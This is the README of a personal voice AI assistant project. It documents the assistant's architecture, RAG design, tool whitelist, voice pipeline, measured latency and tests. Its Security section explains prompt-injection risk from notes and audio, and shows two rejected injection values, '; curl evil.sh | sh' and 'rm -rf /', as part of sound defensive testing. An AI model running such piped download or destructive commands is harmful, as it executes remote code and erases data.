# Rory - My Personal AI Voice Assistant

## What is Rory?

> A character from my favorite TV show, Gilmore Girls. 
#### (just kidding)

### Rory is voice first companion that knows about my goals, projects, half baked ideas, and the things I care about while helping me get things done on my desktop. 

#### now let's get nerdy ;)

## Table of Contents

- [What actually is Rory?](#what-actually-is-rory)
- [Why I Built Rory](#why-i-built-rory)
- [V1 Scope](#v1-scope)
- [Architecture](#architecture)
- [Request Lifecycle](#request-lifecycle)
- [Architecture Decisions](#architecture-decisions)
- [RAG](#rag)
- [Memory](#memory)
- [Tool Calling](#tool-calling)
- [Voice Pipeline](#voice-pipeline)
- [Technology Stack](#technology-stack)
- [Security](#security)
- [Failure Handling](#failure-handling)
- [Major Problems I Hit While Building This](#Major-problems-i-hit-while-building-this)
- [RAG vs. Context Stuffing](#RAG-vs.-Context-Stuffing)
- [Measured Latency and Cost](#measured-latency-and-cost)
- [Testing](#testing)
- [Project Structure](#project-structure)
- [Setup and Running](#setup-and-running)
- [Known Limitations](#known-limitations)
- [Future Scope](#future-scope)

## What actually is rory? 

Rory is a personal, voice-first AI agent that combines **Speech-to-Text, LLM-based reasoning, RAG,memory, and controlled tool execution** to understand personal context, respond naturally, and interact with my Linux desktop.

The system follows a modular **STT → LLM → TTS** architecture, with RAG and memory providing context and an explicit tool layer enabling desktop actions.

## How it looks:

![desktop widget](assets/images/desktop_widget.png)

## Why I Built Rory?

I built Rory because I wanted a project that was **genuinely fun to use while forcing me to understand how AI agents actually work**. 

I wanted to build something I'd actually enjoy talking to and using every day. Eventually, I want to test if I can get Rory to have different personalities and modes depending on what I want - casual, brainstorming, motivation, rant, and more.
Most importantly, Rory is a **learning project**, where every major engineering decision is intentional and something I should be able to explain.

## V1 Scope

The first version of Rory focuses on the core experience: **talk to Rory, get a relevant response, and let Rory perform a few useful actions.**

V1 includes:

- Voice input and output
- LLM-powered conversation
- Personal knowledge base with RAG
- Conversational memory
- A small set of controlled Linux desktop tools
- Simple desktop interface with click-to-wake
- Decoupled **STT → LLM → TTS** pipeline

V1 intentionally keeps the scope small. **Long-term memory, multiple personality modes, wake-word activation, advanced computer control, and local AI models** are left for future versions.

## Architecture

![Rory Architecture](assets/images/rory-architecture.svg)

## Request Lifecycle

![Rory Request Lifecycle](assets/images/rory-request-lifecycle.svg)


## Architecture Decisions

| Decision | Rejected alternative | Why |
|---|---|---|
| Single process, no HTTP layer (ADR-001) | Local FastAPI server | One user, one machine, no second client. A function call is the unit of testing instead of a request. |
| CLI as the primary dev interface (ADR-002) | CLI as a debug afterthought | The CLI is what proves the core is genuinely audio-agnostic. If the core could only be driven by voice, that property would be untested. |
| Whitelisted enum tools (ADR-003) | `run_shell(command: str)` | The model reads personal notes and transcribes arbitrary audio, so attacker-controllable text can reach its context. If the model can emit a command string, so can that text. |
| Variation in arguments, not tool count (ADR-004) | One tool per app | "Open my browser" and "open ChatGPT" are the same action with different arguments. Adding an app is one dict entry. |
| NumPy `.npz` index (ADR-005) | Qdrant, Chroma, FAISS | 186 chunks. Brute force cosine over 186 vectors of 384 dims is one matmul, measured in milliseconds. |
| Retrieval as a tool (ADR-006) | Always-on pre-retrieval | Most turns ("thanks", "open my terminal", "what time is it") need no personal context. Retrieval only costs a round trip when something is actually being looked up. |
| Local embeddings (ADR-007) | Hosted embedding API | Embedding is on the hot path of every retrieval. A local model means no second network dependency stacked in front of the LLM call. |
| Decoupled STT → LLM → TTS (ADR-008) | Managed realtime voice API | A realtime API collapses three swappable Protocols into one vendor integration, and the tool calling and RAG work would have to be re-expressed in whatever that product allows. |
| Click to stop (ADR-009) | Voice activity detection | VAD is a real subsystem: a threshold to tune per microphone and per room, plus a probabilistic failure mode that is hard to debug. A keypress has none of that. |
| TTS disk cache plus local fallback (ADR-010) | Paying for every synthesis | Iterating on a voice app re-synthesises the same test phrases constantly. Cache turns that into a disk read. |
| PySide6 (ADR-011) | Tkinter, GTK | Qt marshals signals across threads automatically. The threading correctness the widget depends on is a framework guarantee rather than a convention I enforce by hand. |
| Tray, then persistent SVG widget (ADR-012, ADR-013) | Floating always-on-top window | Under Wayland a client cannot position or pin its own window. Building on that assumption would misbehave differently on every compositor. |
| `bulbul:v3` plus retry before degrade (ADR-014) | Staying on `bulbul:v2` | Measured 2/5 success on v2 against 5/5 on v3. Detail in the problems section below. |


## RAG

Rory's knowledge base is a set of Markdown files containing personal information about my projects, goals, ideas, and other context. The files are indexed once and queried only when Rory decides it needs them.

At runtime:

A few design decisions

Why NumPy instead of a vector database?
The knowledge base currently contains only 186 chunks. At this scale, brute-force cosine search is effectively a single matrix multiplication and takes milliseconds. A vector database like Qdrant would add another service, configuration, and failure point without solving a problem I currently have.

The index is therefore just a NumPy .npz file and a JSON metadata file. If retrieval ever becomes a measurable bottleneck, that's when I'd introduce a vector database.

Why header-aware chunking?
The knowledge base is written in Markdown, so the headings already contain useful context. Rory preserves the heading hierarchy when creating chunks instead of blindly splitting text by character count.

For example:

That context is stored with the chunk and returned alongside the retrieved text.

Why is retrieval a tool?
Rory does not search the knowledge base for every message. search_notes is a tool that Gemini can call when it needs specific personal information.

This keeps normal conversations lightweight, while still allowing Rory to look up details when necessary.

The tradeoff is that retrieval now depends on the model deciding to call the tool. This is one of the limitations I measured during evaluation.

Why the 0.58 threshold?
The threshold was calibrated against the actual knowledge base rather than chosen arbitrarily. Queries unrelated to my notes generally scored below 0.55, while relevant queries scored 0.65+. 0.58 provides a small gap between the two.

If nothing passes the threshold, Rory returns an empty result instead of passing a weak match to the LLM. This gives the model an explicit signal that the information was not found in the knowledge base.

The profile card is separate from RAG.
Rory also receives a small, manually written profile card on every turn. It contains stable, high-level context that should not depend on retrieval.

Specific or detailed information stays in the knowledge base and must be retrieved through search_notes.

## Memory

Conversation memory is a sliding window of the last `MAX_HISTORY_MESSAGES = 20`
messages, held in memory inside a `RoryCore` instance. Nothing is persisted; the
history is gone when the process exits.

I chose this because it is O(1) per turn and cannot grow unboundedly. The failure
mode is real and worth stating plainly: once a conversation passes 20 messages,
the oldest ones drop out silently. A fact mentioned early stops being remembered
with no error and no warning.

Tool exchanges are written into that same history as ordinary text messages
(`TOOL CALLS` / `TOOL RESULTS`), which keeps `Message` a plain `{role, content}`
pair rather than adding a provider-specific message type. It also means the next
turn can see what was actually run.

Long term memory and summarisation are deliberately out of V1 scope. Anything
more than a window is a real feature, not a patch on this one.

## Tool Calling

Four tools, all registered through the same `@tool` decorator:

| tool | arguments | returns |
|---|---|---|
| `search_notes` | `query: str` | `{ok, results[]}` |
| `open_app` | `app: <enum>` | `{ok, detail}` |
| `check_app_running` | `app: <enum>` | `{ok, running, verified, detail}` |
| `get_datetime` | none | `{ok, iso, human, timezone, day_of_week}` |

The dispatch path:

```
model emits ToolCall(name, arguments)      <- untrusted
        ↓
registry.dispatch(name, arguments)
        ↓  tool exists?             no -> {ok: false, error}
        ↓  arguments validated?     no -> {ok: false, error}   enum checked HERE
        ↓  ═════════ trust boundary ═════════
tool function runs        APPS[app] -> hardcoded argv list
        ↓  raises?                  yes -> {ok: false, error}
        ↓
truncate_result(...)  2KB cap
        ↓
appended to history as a TOOL RESULTS message -> next iteration
```

`dispatch` never raises. An unknown tool, a bad argument, or an exception inside
a tool all become an ordinary `{ok: false, error}` result that the model reads
and explains to me. A broken tool degrades into a sentence, not a crash.

The JSON schema is generated from Python type hints. A `Literal[...]` hint becomes
an enum, and `AppName = Literal[*APPS]` derives that enum from the whitelist keys
themselves. There is no second list to forget to update.

The agent loop caps at `MAX_ITERATIONS = 4`. A confused model must not spin
forever.

### verified is separate from running

`check_app_running` returns `verified` alongside `running` because "it is not
running" and "I could not tell whether it is running" are different answers, and
collapsing them is exactly how an assistant starts fabricating.

| situation | ok | running | verified |
|---|---|---|---|
| process matched | true | true | true |
| full scan, no match | true | false | true |
| some processes unreadable, no match | true | false | **false** |
| scan failed, or app has no distinct process name | false | **null** | **false** |

`running: null` rather than `false` in the last row is deliberate. There is no
value the model could mistake for an answer.

This is not hypothetical. `chatgpt` launches inside a shared chromium process, so
it genuinely cannot be identified by process name, and the tool reports that
instead of guessing. I verified the whole path against a real recording of
ambient silence: Sarvam returned `""`, `is_usable("")` rejected it, and
`handle_text` was never called.

## Voice Pipeline

Three independent stages glued together in the adapter, never a single managed
voice API:

```
record → STT.transcribe → RoryCore.handle_text → TTS.synthesize → play
```

Each of `LLM`, `STT` and `TTS` is a small Protocol with one implementation. That
is what let me swap the TTS model, add retry logic, and add a local fallback
without touching the core.

**Recording is click to start, click to stop.** No VAD, no endpointing, no
streaming, no wake word. `Recorder` captures exactly what happened between the
two events.

**Resampling is real, not assumed.** The input stream opens at the device's own
default rate because some ALSA hardware rejects arbitrary rates, then the capture
is resampled to 16 kHz with numpy linear interpolation. There is no scipy in the
dependency list, and linear is more than good enough for speech going into an STT
model. Measured on my machine: 44100 Hz native in, exactly 16000 Hz out.

**The transcript is always shown before the answer in the CLI.** Mishearing a
proper noun is the single most common failure in a voice pipeline built over
personal notes. "Relay" becoming "railay" is not catchable from inside the STT or
LLM call. Printing what Rory heard, before what it answered, is the cheapest fix
that actually works.

**TTS output is stripped of markdown before synthesis.** The LLM writes `**CUSTOS**`
for visual emphasis and the synthesiser reads the asterisks out loud. This is
handled in code rather than by a prompt instruction, because an LLM avoiding
markdown "most of the time" is not good enough when the failure is audible.

**Synthesised audio is cached** under `data/tts_cache/`, keyed by
`sha256(text + model + voice)`. The model and voice are part of the key so
switching either can never replay stale audio in the wrong voice.

## Technology Stack

The full dependency list, and why each one is there:

| dependency | role | why this one |
|---|---|---|
| `google-genai` | LLM | Gemini, currently `gemini-flash-lite-latest` |
| `pydantic-settings` | config | Validates at import, so a missing key fails at startup rather than mid-turn |
| `httpx` | HTTP | Sarvam STT and TTS calls |
| `numpy` | vectors, resampling | The entire vector store, plus linear resampling |
| `fastembed` | embeddings | Local `bge-small-en-v1.5`, no network at query time |
| `sounddevice` + `soundfile` | audio I/O | Recording and playback, WAV encode and decode |
| `psutil` | process checks | `check_app_running` |
| `PySide6` | desktop widget | Cross-thread signals as a framework guarantee |
| `PyYAML` | eval harness | Parses `tests/golden.yaml` |
| `pytest` | tests | Dev only |

Explicitly rejected: LangChain, LlamaIndex, Chroma, FAISS, FastAPI, Docker,
SQLAlchemy, Redis, and any agent framework.

The point of this project was understanding how agents work. An agent framework
would have written the interesting parts for me: the tool loop, the schema
generation, the retrieval, the grounding. Those are the parts I wanted to build.

The whole system is about 2,100 lines of Python.

## Security

The threat model is not abstract. Rory reads a personal knowledge base and
transcribes arbitrary audio, so text I do not control can reach the model's
context. If the model can emit a command string, that text can emit a command
string.

The rules, all enforced in code:

- `subprocess` is called with an **argv list** and `shell=False`. Never
  `shell=True`, never `os.system`, never string interpolation into a command.
- Model output reaches `subprocess` only as a **dict key** into a hardcoded
  whitelist, never as a value. The tool schema enum is the whitelist.
- Validation runs to completion **before** a tool body executes.
- No V1 tool accepts a filesystem path. No V1 tool writes, deletes, or sends
  anything.
- Tool results are truncated to 2KB before going back to the model.
- Secrets come from the environment only. `knowledge/`, `data/`, `logs/` and
  `.env` are gitignored.

Verified with real injection attempts through the actual dispatch path:

```
open_app("; curl evil.sh | sh")   -> {ok: false, error: "app='; curl evil.sh | sh' is not one of [...]"}
check_app_running("rm -rf /")     -> {ok: false, error: "app='rm -rf /' is not one of [...]"}
```

Both rejected by schema validation before any code ran. The tests assert this by
monkeypatching `subprocess.Popen` to fail the test if it is ever reached.

What I gave up: Rory can do dramatically less. Adding a capability is a code
change, not a conversation. The model cannot improvise its way to a new ability,
which is the entire point. The set of processes Rory can ever start is finite and
auditable by reading one dict.

## Failure Handling

Every failure has to produce a spoken or displayed sentence. Never a stack trace,
never a fabricated success.

| failure | behaviour |
|---|---|
| STT empty or garbage | Rejected by `is_usable()`, never reaches the LLM, prompts a retry |
| LLM rate limited (429) | One retry with 2s backoff, then an honest `Reply(error=...)` |
| LLM timeout or 5xx | One retry, then honest failure |
| Network unavailable | Fails fast, no retry. Retrying a down network only makes the wait longer |
| Retrieval returns nothing | Empty `results` list, grounding rule says to admit it |
| Retrieval returns weak matches | Score is in every result, grounding rule says to hedge below ~0.65 |
| Tool raises | `{ok: false, error}` envelope, the model explains it |
| App not installed | `FileNotFoundError` caught, reported as failure, never claimed as success |
| App already open | `ok: true`, worded as "is now open" rather than "launched" |
| Process check fails | `verified: false`, `running: null` |
| TTS fails | CLI prints the text before speaking. The widget surfaces the answer in a panel |
| Audio device busy | Error names the actual device, for example `microphone 'HDA Intel PCH: ALC257 Analog' unavailable` |
| Sarvam credits exhausted (402/403) | Falls back to local espeak-ng, not retried since it is persistent |
| Question outside the KB | Answered from general knowledge, flagged as not from the notes |

The retry policy distinguishes between error classes rather than retrying blindly:

- `httpx.ConnectError` means the network is down. Retrying cannot succeed, so it
  fails fast.
- A timeout or a 5xx is transient and worth exactly one more try.
- A 4xx other than 402/403 is a bug worth surfacing, so it re-raises.

That distinction is not decorative. Before I added it, a dead network caused TTS
to burn three full attempts before falling back to the local voice that works
offline. I verified the fix by counting attempts.

`tests/test_failure_modes.py` covers this table deterministically with `FakeLLM`,
offline and free.

## Major Problems I Hit While Building This

The parts that actually taught me something.

### 1. Speech was slow and sounded robotic, and it was one bug

Two symptoms that looked unrelated: replies took about 30 seconds to speak, and
the voice sometimes sounded buzzy instead of natural.

**Diagnosis.** The trace made it obvious once I looked at the shape of the data
rather than the average:

| chars | elapsed |
|---|---|
| 66 | 0.99s |
| 25 | **30.52s** |
| 199 | **30.54s** |
| 22 | **30.53s** |

22 characters taking 30.5s while 66 characters took 0.9s. A flat constant
independent of input size is a timeout signature, not synthesis time. Sarvam's
`bulbul:v2` was failing about half the time, hanging ~30.3s before returning a
500. My 60s httpx timeout never fired because their server errored first. Then
`FallbackTTS` degraded to espeak-ng, a formant synthesiser, which was the "noise".
So the wait and the bad voice were the same bug seen from two angles.

**The fix I almost shipped.** I first retried v2 harder. That got mean latency to
about 11s with 2 of 6 turns still degrading to espeak-ng. It treated the symptom
while staying on a broken model.

**The actual fix.** I tested the other model:

| model | success | timings |
|---|---|---|
| `bulbul:v2` / manisha | 2/5 | 1.2s, fail 30s, fail 30s, 1.1s, fail 30s |
| `bulbul:v3` / shreya | 5/5 | 1.7s to 2.7s |

Switched to v3, cut the timeout from 60s to 5s (successful calls never exceed
~2.2s even at 300 characters, so the two populations are cleanly separated), and
kept a retry as cheap insurance. Result: mean 11.13s to **2.06s**, max 15.68s to
**2.94s**, zero degradations.

**What I took from it.** The cheap experiment (try the other model) beat the
clever workaround (retry harder). I also added `last_engine` to the trace so
"why does it sound bad" is answerable from a log line instead of guesswork. That
ambiguity is why it took two rounds to find.
.

### 2. Retrieval that was technically working and practically useless

I added family details to my notes. "what is my mom's name" worked. "what is my
dog's name" returned nothing, even though the answer was right there.

**Diagnosis.** It scored 0.566 against the 0.58 threshold. The facts had been
appended mid-paragraph inside a section about backend engineering, so the chunk's
embedding was dominated by unrelated content.

**Fix.** Gave the facts their own heading. Same content, same threshold:

| query | before | after |
|---|---|---|
| "what is my dog's name" | 0.566 (miss) | **0.752** |
| "tell me about my friends" | 0.667 | **0.814** |

That is why [knowledge/README.md](knowledge/README.md) insists on real markdown
headings. The chunker
is header aware, so headings are not cosmetic, they are the primary signal.

The residual limitation is real and I left it: bare single-name queries like "who
is Marcel" still score ~0.55 and miss. Lowering the threshold to catch them would
trade a genuine safety property for a convenience one.
finished` signal.

### RAG vs. Context Stuffing

*Results from 2026-08-26*

| Metric | RAG | Context Stuffing |
|---|---|---|
| Cases passed | 16/20 | 19/20 |
| Avg. prompt tokens/call | 960 | 12,088 |
| Calls per case | 1–2 | 1 |

At this size, stuffing performed slightly better because the entire knowledge base is always available to the model, so there is no retrieval or tool-routing step that can be missed.

RAG's main advantage was efficiency: it used **~92% fewer prompt tokens per call**. The failures also revealed some real limitations:

- Some failures happened because the model decided not to call `search_notes` when the profile card already contained partial information.
- One failure was a genuine retrieval miss on a broad question such as *"which of my projects use RAG?"*
- The stuffing approach also failed on one question despite having the entire knowledge base in context.

**Verdict:** keeping RAG. At the current size, stuffing is competitive, but RAG gives the system much better headroom as the knowledge base grows.

## Measured Latency and Cost

From `logs/trace.jsonl` over 8 real turns (a mix of RAG, tool and plain
conversation) plus 5 real STT round trips, on 2026-08-27. Measured, not estimated,
and deliberately not optimised.

| stage | n | median | worst |
|---|---|---|---|
| `stt` (Sarvam Saaras) | 5 | 0.82s | 1.02s |
| `llm_generate` (per call) | 14 | 0.95s | 1.34s |
| `tool_dispatch` | 6 | 0.03s | 0.25s |
| `tts` (Sarvam Bulbul v3) | 8 | 2.35s | 5.52s |
| `turn_complete` (LLM + tools, excludes STT/TTS) | 8 | 1.99s | 2.10s |

**End to end for a spoken turn is about 4.2s median.** TTS dominates at roughly
half the wall clock. A tool-calling or RAG turn costs about 2 LLM round trips
(14 calls over 8 turns), which is why `turn_complete` is roughly twice a single
`llm_generate`.

**Token cost per turn:** about 1,818 prompt and 44 completion tokens. At current
Gemini Flash-Lite rates that is roughly **$0.0005 per turn**, about $1 per 2,000
turns. On the free tier it is $0, subject to per-minute and per-day caps. Sarvam
bills against prepaid credits by character and duration, around 116 characters of
speech per turn.

The one cost lever already in place is the TTS cache. A repeated phrase costs
nothing the second time.

Note on sample size: this is 8 turns in one sitting on one network. TTS worst case
is about 2.3x its median, and Sarvam's reliability varied a lot across this
project. Treat 4.2s as indicative, not a guarantee.

## Testing

```bash
pip install -e ".[dev]"
pytest
```

93 tests, all offline and free. No API keys needed to run the default suite.

| file | tests | covers |
|---|---|---|
| `test_failure_modes.py` | 22 | The failure matrix, deterministically with `FakeLLM` |
| `test_voice.py` | 22 | WAV round trip, resampling, TTS cache, fallback, markdown stripping |
| `test_tools.py` | 15 | Registry validation, injection rejection, argv/shell assertions |
| `test_agent.py` | 12 | Tool loop, iteration cap, leaked tool-call detection |
| `test_rag.py` | 9 | Header-aware chunking, overlap, threshold behaviour |
| `test_widget.py` | 8 | State transitions, worker threading, paint safety |
| `test_core.py` | 5 | Turn handling, history, config failure |

Tests marked `live` hit real APIs and are excluded by default (`pytest -m live`
to include them).

The testing rules that mattered:

- Anything touching the agent loop uses `tests/fakes.py::FakeLLM`. Agent tests are
  deterministic, offline and free.
- No pixel or rendering tests. State transitions only.
- A test I have not verified against known-bad input is worth very little, which
  I learned the hard way (problem 3 above).

## Project Structure

```
rory/
  config.py         Settings, validated at import
  core.py           RoryCore facade, session, turn_id, trace, error envelope
  cli.py            text REPL, the primary development interface
  trace.py          structured JSONL turn logging
  llm.py            LLM Protocol + Gemini implementation + retry policy
  eval.py           golden-question harness, RAG vs stuffing
  agent/
    loop.py         the tool-calling loop
    prompts.py      persona, profile card, grounding rules
  rag/
    ingest.py       chunk + embed + write index
    embed.py        Embedder Protocol + local model
    retrieve.py     load index, cosine search, threshold, search_notes tool
  tools/
    registry.py     @tool decorator, schema generation, validation, dispatch
    desktop.py      THE WHITELIST, subprocess + psutil
    clock.py        get_datetime
  voice/
    audio.py        record to WAV bytes, resample, play
    stt.py          STT Protocol + Sarvam Saaras
    tts.py          TTS Protocol + Sarvam Bulbul + local fallback + cache
  ui/
    widget.py       Qt widget, 5 states, worker thread, socket trigger

tests/              93 offline tests + golden.yaml
docs/               ARCHITECTURE.md, DECISIONS.md (14 ADRs)
knowledge/          personal markdown notes (gitignored)
data/               generated index + TTS cache (gitignored, regenerable)
logs/               trace.jsonl (gitignored)
```

There is no `utils.py`, no `helpers.py`, no `base/`, no `interfaces/`, no
`services/`. A Protocol lives beside its implementation until there are two
implementations.

Everything under `data/` and `logs/` is derived and disposable. Only
`knowledge/*.md` is irreplaceable, and it is gitignored by design.

## Setup and Running

Full setup, voice configuration, Hyprland/Wayland notes and the eval harness are
in [docs/SETUP.md](docs/SETUP.md). The short version:

```bash
python -m venv .venv && source .venv/bin/activate
pip install -e .
cp .env.example .env          # add GEMINI_API_KEY
python -m rory.rag.ingest     # build the index from knowledge/*.md

python -m rory.cli            # text + voice REPL
./run.sh                      # desktop widget
```

Rory fails loudly at startup if `GEMINI_API_KEY` is missing. It will not run half
configured.

Voice output works offline with espeak-ng by default (`TTS_ENGINE=local`). Speech
input needs `SARVAM_API_KEY` and a network, since there is no local STT fallback.

## Known Limitations

Accepted V1 tradeoffs, not bugs to be surprised by. The retrieval, memory and
latency limits are explained where they arise above; this is the consolidated
list, including the ones not covered elsewhere.

- **Retrieval misses bare single-name queries.** "who is Marcel" scores ~0.55
  against the 0.58 threshold. Short, low-signal queries under-retrieve, and
  lowering the threshold would trade a safety property for a convenience one.
- **Memory is a fixed 20-message window**, no summarisation, silent eviction.
- **Latency is not optimised**, ~4.2s median, dominated by TTS.
- **STT has no local fallback.** TTS degrades to espeak-ng offline; STT cannot
  run at all without `SARVAM_API_KEY` and a network.
- **The widget shows no transcript**, so a misheard name looks like a wrong
  answer. The CLI prints `heard: ...` and is the better surface for diagnosing
  that. An unspoken answer is not lost: if TTS fails the reply text appears.
- **Gemini occasionally emits tool-call syntax as plain text.** The loop detects
  and corrects it, but the underlying behaviour is non-deterministic.
- **No authentication or sandboxing.** Anything that can write to
  `$XDG_RUNTIME_DIR/rory.sock` can trigger listening. Fine for a single-user
  desktop, not a multi-user design.
- **`rory/ui/widget.py` is the largest file in the project** and does more than
  one job. It is the first thing I would split.

## Future Scope

Ordered roughly by what I would actually do first.

**Cut perceived latency.** TTS is about half the wall clock, and the whole reply
is synthesised before any audio plays. Splitting the reply into sentences and
playing the first while synthesising the rest would cut time-to-first-audio
substantially without touching the core. This is the single biggest user-visible
improvement available.

**Better memory than a 20-message window.** Summarise older turns instead of
dropping them silently. The current failure mode (a fact silently ageing out) is
the kind of thing that is confusing precisely because it produces no error.

**Fix retrieval for short and enumerative queries.** Two measured gaps: bare
single-name queries fall just under the threshold, and broad questions like
"which projects use RAG" retrieve the wrong chunks. Hybrid keyword plus vector
search, or a reranking pass, would address both. This is worth doing before
growing the knowledge base, not after.

**Persist conversations.** History is currently in memory only.

**Split `ui/widget.py`.** Worker, sticky widget, status button and wiring are four
genuinely different reasons to change.

**More tools, carefully.** The whitelist pattern makes adding an app a one-line
change. The interesting question is whether anything needs to *write* something,
which would be the first V1 security rule to relax and deserves its own ADR.

Deliberately still out of scope: wake-word activation, multiple personality modes,
local LLM inference, and any form of unrestricted computer control.
